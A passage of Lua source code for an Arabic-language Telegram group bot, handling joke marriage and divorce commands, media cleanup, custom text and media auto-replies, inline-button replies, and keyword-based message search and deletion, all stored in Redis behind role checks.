elseif tonumber(Redis:get(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:")) == tonumber(msg.sender.user_id) or tonumber(Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")) == tonumber(Message_Reply.sender.user_id) then
    Redis:del(darket..msg_chat_id..Message_Reply.sender.user_id.."mtzwga:")
    Redis:del(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")
    return send(msg_chat_id,msg_id,"تم طلاقكم وشوفو العيال هتبقا مع مين","md")
  end
end
if text == "بوت طلقني" then
  if not Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:") then 
  return send(msg_chat_id,msg_id,"انت ولا متزوج ولا متنيل عشان اطلقك","md")
  elseif Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:") then
    local zwg_id = Redis:get(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")
    local zwg_name = LuaTele.getUser(zwg_id).first_name
    Redis:del(darket..msg_chat_id..msg.sender.user_id.."mtzwga:")
    Redis:del(darket..msg_chat_id..zwg_id.."mtzwga:")
    return send(msg_chat_id,msg_id,"تم طلاقك من ["..zwg_name.."](tg://user?id="..zwg_id..")\nشوفو مين هياخد العيال بقا","md")
  end
end
-------

if text == "مسح الميديا" then 
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص المدير *',"md",true)  
end
local list = Redis:smembers(darket.."darket:cleaner"..msg.chat_id)
if #list == 0 then 
return send(msg_chat_id,msg_id,"٠  لا يوجد وسائط مجدوله للحذف \n ","md",true) 
end
for k,v in pairs(list) do 
LuaTele.deleteMessages(msg.chat_id,{[1]= v})
end
Redis:del(darket.."darket:cleaner"..msg.chat_id)
send(msg_chat_id,msg_id,"٠  تم مسح "..#list.." من الميديا","md",true)
end

if text == "عدد الميديا" then
local list = Redis:smembers(darket.."darket:cleaner"..msg_chat_id)
return send(msg_chat_id,msg_id,"عدد الميديا هو "..#list.."","md",true)
end
---
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo and msg.sender.user_id ~= darket then
local test = Redis:get(darket.."Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id)
if Redis:get(darket.."Set:Rd:mz"..msg.sender.user_id..":"..msg_chat_id) == "true1" then
Redis:del(darket.."Set:Rd:mz"..msg.sender.user_id..":"..msg_chat_id)
if msg.content.text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(darket.."Add:Rd:Sudo:mz:Text"..test, text)  
elseif msg.content.sticker then   
Redis:set(darket.."Add:Rd:Sudo:mz:stekr"..test, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then  
Redis:set(darket.."Add:Rd:Sudo:mz:vico"..test, msg.content.voice_note.voice.remote.id)  
elseif msg.content.animation then   
Redis:set(darket.."Add:Rd:Sudo:mz:Gif"..test, msg.content.animation.animation.remote.id)  
elseif msg.content.audio then
Redis:set(darket.."Add:Rd:Sudo:mz:Audio"..test, msg.content.audio.audio.remote.id)  
Redis:set(darket.."Add:Rd:Sudo:mz:Audioc"..test, msg.content.caption.text)  
elseif msg.content.document then
Redis:set(darket.."Add:Rd:Sudo:mz:File"..test, msg.content.document.document.remote.id)  
elseif msg.content.video then
Redis:set(darket.."Add:Rd:Sudo:mz:Video"..test, msg.content.video.video.remote.id)  
Redis:set(darket.."Add:Rd:Sudo:mz:Videoc"..test, msg.content.caption.text)  
elseif msg.content.video_note then
Redis:set(darket.."Add:Rd:Sudo:mz:video_note"..test..msg_chat_id, msg.content.video_note.video.remote.id)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
Redis:set(darket.."Add:Rd:Sudo:mz:Photo"..test, idPhoto)  
Redis:set(darket.."Add:Rd:Sudo:mz:Photoc"..test, msg.content.caption.text)  
end
send(msg_chat_id,msg_id,"٠ تم حفظ الرد \n٠ ارسل ( "..test.." ) لرئية الرد","md",true)  
return false
end  
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."Set:Rd:mz"..msg.sender.user_id..":"..msg_chat_id) == "true" then
Redis:set(darket.."Set:Rd:mz"..msg.sender.user_id..":"..msg_chat_id, "true1")
Redis:set(darket.."Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id, text)
Redis:sadd(darket.."List:Rd:Sudo:mz", text)
send(msg_chat_id,msg_id,[[
↯︙ارسل لي الرد سواء كان 
❨ ملف ، ملصق ، متحركه ، صوره
 ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
↯︙يمكنك اضافة الى النص ٠
– – – – – – – –
 `#username` ↬ معرف المستخدم
 `#msgs` ↬ عدد الرسائل
 `#name` ↬ اسم المستخدم
 `#id` ↬ ايدي المستخدم
 `#stast` ↬ رتبة المستخدم
 `#edit` ↬ عدد التعديلات

]],"md",true)  
return false
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."Set:On:mz"..msg.sender.user_id..":"..msg_chat_id) == "true" then
list = {"Add:Rd:Sudo:mz:video_note","Add:Rd:Sudo:mz:Audio","Add:Rd:Sudo:mz:Audioc","Add:Rd:Sudo:mz:File","Add:Rd:Sudo:mz:Video","Add:Rd:Sudo:mz:Videoc","Add:Rd:Sudo:mz:Photo","Add:Rd:Sudo:mz:Photoc","Add:Rd:Sudo:mz:Text","Add:Rd:Sudo:mz:stekr","Add:Rd:Sudo:mz:vico","Add:Rd:Sudo:mz:Gif"}
for k,v in pairs(list) do
Redis:del(darket..''..v..text)
end
Redis:del(darket.."Set:On:mz"..msg.sender.user_id..":"..msg_chat_id)
Redis:srem(darket.."List:Rd:Sudo:mz", text)
return send(msg_chat_id,msg_id,"٠ تم حذف الرد من الردود العامه","md",true)  
end
end

if text and text ~= "حذف رد مميز" and text ~= "اضف رد مميز" and text ~= "مسح الردود المميزه" and not Redis:get(darket.."Status:ReplySudo"..msg_chat_id) then
if not Redis:sismember(darket..'Spam:Group'..msg.sender.user_id,text) then
local listmz = Redis:smembers(darket.."List:Rd:Sudo:mz")
for k,v in pairs(listmz) do
i ,j  = string.find(text, v)
if j and i then
local x = string.sub(text, i,j)
if x then
local anemi = Redis:get(darket.."Add:Rd:Sudo:mz:Gif"..x)   
local veico = Redis:get(darket.."Add:Rd:Sudo:mz:vico"..x)   
local stekr = Redis:get(darket.."Add:Rd:Sudo:mz:stekr"..x)     
local Text = Redis:get(darket.."Add:Rd:Sudo:mz:Text"..x)   
local photo = Redis:get(darket.."Add:Rd:Sudo:mz:Photo"..x)
local photoc = Redis:get(darket.."Add:Rd:Sudo:mz:Photoc"..x)
local video = Redis:get(darket.."Add:Rd:Sudo:mz:Video"..x)
local videoc = Redis:get(darket.."Add:Rd:Sudo:mz:Videoc"..x)
local document = Redis:get(darket.."Add:Rd:Sudo:mz:File"..x)
local audio = Redis:get(darket.."Add:Rd:Sudo:mz:Audio"..x)
local audioc = Redis:get(darket.."Add:Rd:Sudo:mz:Audioc"..x)
local video_note = Redis:get(darket.."Add:Rd:Sudo:mz:video_note"..x)
if Text then 
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local NumMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = msg.Name_Controller
local NumMessageEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local Text = Text:gsub('#username',(UserInfo.username or 'لا يوجد')) 
local Text = Text:gsub('#name',UserInfo.first_name)
local Text = Text:gsub('#id',msg.sender.user_id)
local Text = Text:gsub('#edit',NumMessageEdit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg_chat_id,msg_id,'['..Text..']',"md",true)  
end
if video_note then
LuaTele.sendVideoNote(msg_chat_id, msg.id, video_note)
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if photo then
LuaTele.sendPhoto(msg.chat_id, msg.id, photo,photoc)
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end  
if stekr then 
LuaTele.sendSticker(msg_chat_id, msg.id, stekr)
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if veico then 
LuaTele.sendVoiceNote(msg_chat_id, msg.id, veico, '', 'md')
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if video then 
LuaTele.sendVideo(msg_chat_id, msg.id, video, videoc, "md")
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if anemi then 
LuaTele.sendAnimation(msg_chat_id,msg.id, anemi, '', 'md')
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
if document then
LuaTele.sendDocument(msg_chat_id, msg.id, document, '', 'md')
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end  
if audio then
LuaTele.sendAudio(msg_chat_id, msg.id, audio, audioc, "md") 
Redis:sadd(darket.."Spam:Group"..msg.sender.user_id,text) 
end
end
end
end
end
end
if text == "اضف رد مميز" then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Set:Rd:mz"..msg.sender.user_id..":"..msg_chat_id,true)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
},
}
}
return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لاضافتها في الردود المميزه ","md",false, false, false, false, reply_markup)
end 
if text == "حذف رد مميز" then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Set:On:mz"..msg.sender.user_id..":"..msg_chat_id,true)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
},
}
}
return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لحذفها من الردود المميزه","md",false, false, false, false, reply_markup)
end 
if text and not Redis:sismember(darket.."Spam:Group"..msg.sender.user_id,text) then
Redis:del(darket.."Spam:Group"..msg.sender.user_id) 
end
if text == "مسح الردود المميزه" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Rd:Sudo:mz")
for k,v in pairs(list) do
Redis:del(darket.."Add:Rd:Sudo:mz:Gif"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:vico"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:stekr"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:Text"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:Photo"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:Photoc"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:Video"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:Videoc"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:File"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:Audio"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:Audioc"..v)
Redis:del(darket.."Add:Rd:Sudo:mz:video_note"..v)
Redis:del(darket.."List:Rd:Sudo:mz")
end
send(msg_chat_id,msg_id,"٠ تم مسح قائمه الردود المميزه","md",true)  
end
if text == ("الردود المميزه") then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Rd:Sudo:mz")
text = "\n٠ قائمة الردود المميزه \n– – – – – – – –\n"
for k,v in pairs(list) do
if Redis:get(darket.."Add:Rd:Sudo:mz:Gif"..v) then
db = "متحركه ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:mz:vico"..v) then
db = "بصمه ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:mz:stekr"..v) then
db = "ملصق ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:mz:Text"..v) then
db = "رساله ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:mz:Photo"..v) then
db = "صوره ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:mz:Video"..v) then
db = "فيديو ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:mz:File"..v) then
db = "ملف ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:mz:Audio"..v) then
db = "اغنيه ٠"
elseif Redis:get(darket.."Add:Rd:Sudo:mz:video_note"..v) then
db = "بصمه فيديو ٠"
end
text = text..""..k.." ٠ {"..v.."} ٠ {"..db.."}\n"
end
if #list == 0 then
text = "٠ لا توجد ردود مميزه"
end
return send(msg_chat_id,msg_id,"["..text.."]","md",true)  
end
-------
if text then
if text:match("^وجد كل (.*)$") or text:match("^ج (.*)$") or text:match("^ايجاد كل (.*)$") then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:del(darket..'3dd:klm'..msg.chat_id)
local mt = text:match("^وجد كل (.*)$") or text:match("^ج (.*)$") or text:match("^ايجاد كل (.*)$")
msgid = (msg.id - (1048576*1000))
y = 0
r = 1048576
for i=1,1000 do
r = r + 1048576
s = LuaTele.getMessage(msg.chat_id,msgid + r)
if s.content and s.content.text then
tx = s.content.text.text
mg = s.id
i ,j = string.find(tx, mt)
if i and j then
Redis:sadd(darket..'3dd:klm'..msg.chat_id,mg)
x = string.sub(tx, i,j)
send(msg_chat_id,mg,".","html",true)
end
end
end
list = Redis:smembers(darket..'3dd:klm'..msg.chat_id)
send(msg_chat_id,msg.id,"تم العثور علي "..#list.." "..mt.."","html",true)
end
end
if text then
if text:match("^مسح كل (.*)$") or text:match("^حذف كل (.*)$") then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:del(darket..'3dd:klm:ms'..msg.chat_id)
local mt = text:match("^مسح كل (.*)$") or text:match("^حذف كل (.*)$") 
msgid = (msg.id - (1048576*1000))
y = 0
r = 1048576
for i=1,1000 do
r = r + 1048576
s = LuaTele.getMessage(msg.chat_id,msgid + r)
if s.content and s.content.text then
tx = s.content.text.text
mg = s.id
i ,j = string.find(tx, mt)
if i and j then
Redis:sadd(darket..'3dd:klm:ms'..msg.chat_id,mg)
LuaTele.deleteMessages(data.chat_id,{[1]= mg})
end
end
end
list = Redis:smembers(darket..'3dd:klm:ms'..msg.chat_id)
send(msg_chat_id,msg.id,"تم مسح "..#list.." رساله تحتوي علي "..mt.."","html",true)
end
end
---انلاين عام 
if text == ("مسح الردود الانلاين العامه") then
  if not msg.Devss then
  return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  المطور الثانوي * ',"md",true)  
  end
  if ChannelJoin(msg) == false then
  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
  return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
  end
  local list = Redis:smembers(darket.."List:Manager:inline3am")
  for k,v in pairs(list) do
      Redis:del(darket.."Add:Rd:Manager:Gif:inline3am"..v)   
      Redis:del(darket.."Add:Rd:Manager:Vico:inline3am"..v)   
      Redis:del(darket.."Add:Rd:Manager:Stekrs:inline3am"..v)     
      Redis:del(darket.."Add:Rd:Manager:Text:inline3am"..v)   
      Redis:del(darket.."Add:Rd:Manager:Photo:inline3am"..v)
      Redis:del(darket.."Add:Rd:Manager:Photoc:inline3am"..v)
      Redis:del(darket.."Add:Rd:Manager:Video:inline3am"..v)
      Redis:del(darket.."Add:Rd:Manager:Videoc:inline3am"..v)  
      Redis:del(darket.."Add:Rd:Manager:File:inline3am"..v)
      Redis:del(darket.."Add:Rd:Manager:video_note:inline3am"..v)
      Redis:del(darket.."Add:Rd:Manager:Audio:inline3am"..v)
      Redis:del(darket.."Add:Rd:Manager:Audioc:inline3am"..v)
      Redis:del(darket.."Rd:Manager:inline3am:v"..v)
      Redis:del(darket.."Rd:Manager:inline3am:link"..v)
  Redis:del(darket.."List:Manager:inline3am")
  end
  return send(msg_chat_id,msg_id,"٠ تم مسح قائمه الانلاين","md",true)  
  end
if text and Redis:get(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id) == "set_link" then
Redis:del(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id)
local anubis = Redis:get(darket.."Text:Manager:inline3am"..msg.sender.user_id..":")
Redis:set(darket.."Rd:Manager:inline3am:link"..anubis, text)
send(msg_chat_id,msg_id,"٠ تم اضافه الرد بنجاح","md",true)  
return false  
end
if text and Redis:get(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id) == "set_inline" then
Redis:set(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id, "set_link")
local anubis = Redis:get(darket.."Text:Manager:inline3am"..msg.sender.user_id..":")
Redis:set(darket.."Rd:Manager:inline3am:text"..anubis, text)
send(msg_chat_id,msg_id,"٠ الان ارسل الرابط","md",true)  
return false  
end
if Redis:get(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id) == "true1" and tonumber(msg.sender.user_id) ~= tonumber(darket) then
Redis:del(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id)
Redis:set(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id,"set_inline")
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
local anubis = Redis:get(darket.."Text:Manager:inline3am"..msg.sender.user_id..":")
if msg.content.text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(darket.."Add:Rd:Manager:Text:inline3am"..anubis, text)
elseif msg.content.sticker then   
Redis:set(darket.."Add:Rd:Manager:Stekrs:inline3am"..anubis, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then  
Redis:set(darket.."Add:Rd:Manager:Vico:inline3am"..anubis, msg.content.voice_note.voice.remote.id)  
elseif msg.content.audio then
Redis:set(darket.."Add:Rd:Manager:Audio:inline3am"..anubis, msg.content.audio.audio.remote.id)  
Redis:set(darket.."Add:Rd:Manager:Audioc:inline3am"..anubis, msg.content.caption.text)  
elseif msg.content.document then
Redis:set(darket.."Add:Rd:Manager:File:inline3am"..anubis, msg.content.document.document.remote.id)  
elseif msg.content.animation then
Redis:set(darket.."Add:Rd:Manager:Gif:inline3am"..anubis, msg.content.animation.animation.remote.id)  
elseif msg.content.video_note then
Redis:set(darket.."Add:Rd:Manager:video_note:inline3am"..anubis, msg.content.video_note.video.remote.id)  
elseif msg.content.video then
Redis:set(darket.."Add:Rd:Manager:Video:inline3am"..anubis, msg.content.video.video.remote.id)  
Redis:set(darket.."Add:Rd:Manager:Videoc:inline3am"..anubis, msg.content.caption.text)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
Redis:set(darket.."Add:Rd:Manager:Photo:inline3am"..anubis, idPhoto)  
Redis:set(darket.."Add:Rd:Manager:Photoc:inline3am"..anubis, msg.content.caption.text)  
end
send(msg_chat_id,msg_id,"٠ الان ارسل الكلام داخل الزر","md",true)  
return false  
end  
end

if text and text:match("^(.*)$") then
if Redis:get(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id.."") == "true2" then
if not Redis:sismember(darket.."List:Manager:inline3am", text) then
 Redis:del(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id.."")
   return send(msg_chat_id,msg_id,"٠ لا يوجد رد لهذه الكلمه","md",true)  
  end
  Redis:del(darket.."Add:Rd:Manager:Gif:inline3am"..text)   
  Redis:del(darket.."Add:Rd:Manager:Vico:inline3am"..text)   
  Redis:del(darket.."Add:Rd:Manager:Stekrs:inline3am"..text)     
  Redis:del(darket.."Add:Rd:Manager:Text:inline3am"..text)   
  Redis:del(darket.."Add:Rd:Manager:Photo:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Photoc:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Video:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Videoc:inline3am"..text)  
  Redis:del(darket.."Add:Rd:Manager:File:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:video_note:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Audio:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Audioc:inline3am"..text)
  Redis:del(darket.."Rd:Manager:inline3am:text"..text)
  Redis:del(darket.."Rd:Manager:inline3am:link"..text)
Redis:del(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id.."")
Redis:srem(darket.."List:Manager:inline3am", text)
send(msg_chat_id,msg_id,"٠ تم حذف الرد من الردود الانلاين العامه","md",true)  
return false
end
end
if text and text:match("^(.*)$") and tonumber(msg.sender.user_id) ~= tonumber(darket) then
  if Redis:get(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id) == "true" then
  Redis:set(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id,"true1")
  Redis:set(darket.."Text:Manager:inline3am"..msg.sender.user_id..":", text)
  Redis:del(darket.."Add:Rd:Manager:Gif:inline3am"..text)   
  Redis:del(darket.."Add:Rd:Manager:Vico:inline3am"..text)   
  Redis:del(darket.."Add:Rd:Manager:Stekrs:inline3am"..text)     
  Redis:del(darket.."Add:Rd:Manager:Text:inline3am"..text)   
  Redis:del(darket.."Add:Rd:Manager:Photo:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Photoc:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Video:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Videoc:inline3am"..text)  
  Redis:del(darket.."Add:Rd:Manager:File:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:video_note:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Audio:inline3am"..text)
  Redis:del(darket.."Add:Rd:Manager:Audioc:inline3am"..text)
  Redis:del(darket.."Rd:Manager:inline3am:text"..text)
  Redis:del(darket.."Rd:Manager:inline3am:link"..text)
  Redis:sadd(darket.."List:Manager:inline3am", text)
  send(msg_chat_id,msg_id,[[
  ↯︙ارسل لي الرد سواء كان 
  ❨ ملف ، ملصق ، متحركه ، صوره
   ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
  ↯︙يمكنك اضافة الى النص ٠
  – – – – – – – –
   `#username` ↬ معرف المستخدم
   `#msgs` ↬ عدد الرسائل
   `#name` ↬ اسم المستخدم
   `#id` ↬ ايدي المستخدم
   `#stast` ↬ رتبة المستخدم
   `#edit` ↬ عدد التعديلات
  
  ]],"md",true)  
  return false
  end
  end
if text == "اضف رد انلاين عام" then
  if not msg.Devss then
  return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  المطور الثانوي * ',"md",true)  
  end
  Redis:set(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id,true)
  local reply_markup = LuaTele.replyMarkup{
  type = 'inline',
  data = {
  {
  {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
  },
  }
  }
  return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لاضافتها في الردود ","md",false, false, false, false, reply_markup)
end


if text and not Redis:get(darket.."Status:Reply:inline3am"..msg_chat_id) then
local btext = Redis:get(darket.."Rd:Manager:inline3am:text"..text)
local blink = Redis:get(darket.."Rd:Manager:inline3am:link"..text)
local anemi = Redis:get(darket.."Add:Rd:Manager:Gif:inline3am"..text)   
local veico = Redis:get(darket.."Add:Rd:Manager:Vico:inline3am"..text)   
local stekr = Redis:get(darket.."Add:Rd:Manager:Stekrs:inline3am"..text)     
local Texingt = Redis:get(darket.."Add:Rd:Manager:Text:inline3am"..text)   
local photo = Redis:get(darket.."Add:Rd:Manager:Photo:inline3am"..text)
local photoc = Redis:get(darket.."Add:Rd:Manager:Photoc:inline3am"..text)
local video = Redis:get(darket.."Add:Rd:Manager:Video:inline3am"..text)
local videoc = Redis:get(darket.."Add:Rd:Manager:Videoc:inline3am"..text)  
local document = Redis:get(darket.."Add:Rd:Manager:File:inline3am"..text)
local audio = Redis:get(darket.."Add:Rd:Manager:Audio:inline3am"..text)
local audioc = Redis:get(darket.."Add:Rd:Manager:Audioc:inline3am"..text)
local video_note = Redis:get(darket.."Add:Rd:Manager:video_note:inline3am"..text)
local reply_markup = LuaTele.replyMarkup{
  type = 'inline',
  data = {
  {
  {text = btext , url = blink},
  },
  }
  }
if Texingt then 
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local NumMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalMsg = Total_message(NumMsg) 
local Status_Gps = msg.Name_Controller
local NumMessageEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local Texingt = Texingt:gsub('#username',(UserInfo.username or 'لا يوجد')) 
local Texingt = Texingt:gsub('#name',UserInfo.first_name)
local Texingt = Texingt:gsub('#id',msg.sender.user_id)
local Texingt = Texingt:gsub('#edit',NumMessageEdit)
local Texingt = Texingt:gsub('#msgs',NumMsg)
local Texingt = Texingt:gsub('#stast',Status_Gps)
send(msg_chat_id,msg_id,'['..Texingt..']',"md",false, false, false, false, reply_markup)  
end
if video_note then
LuaTele.sendVideoNote(msg_chat_id, msg.id, video_note, nil, nil, nil, nil, nil, nil, nil, reply_markup)
end
if photo then
LuaTele.sendPhoto(msg.chat_id, msg.id, photo,photoc,"md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup )
end  
if stekr then 
LuaTele.sendSticker(msg_chat_id, msg.id, stekr,nil,nil,nil,nil,nil,nil,nil,reply_markup)
end
if veico then 
LuaTele.sendVoiceNote(msg_chat_id, msg.id, veico, '', 'md',nil, nil, nil, nil, reply_markup)
end
if video then 
LuaTele.sendVideo(msg_chat_id, msg.id, video, videoc, "md", true, nil, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup)
end
if anemi then 
LuaTele.sendAnimation(msg_chat_id,msg.id, anemi, '', 'md', nil, nil, nil, nil, nil, nil, nil, nil,reply_markup)
end
if document then
LuaTele.sendDocument(msg_chat_id, msg.id, document, '', 'md',nil, nil, nil, nil,nil, reply_markup)
end  
if audio then
LuaTele.sendAudio(msg_chat_id, msg.id, audio, audioc, "md", nil, nil, nil, nil, nil, nil, nil, nil,reply_markup) 
end
end
if text == "حذف رد انلاين عام" then
  if not msg.Devss then
  return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  المطور الثانوي * ',"md",true)  
  end
  if ChannelJoin(msg) == false then
  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
  return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
  end
  local reply_markup = LuaTele.replyMarkup{
  type = 'inline',
  data = {
  {
  {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
  },
  }
  }
  Redis:set(darket.."Set:Manager:rd:inline3am"..msg.sender.user_id..":"..msg_chat_id,"true2")
  return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لحذفها من الردود الانلاين","md",false, false, false, false, reply_markup)
  end 

if text == ("الردود الانلاين العامه") then
  if not msg.Devss then
  return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  المطور الثانوي * ',"md",true)  
  end
  if ChannelJoin(msg) == false then
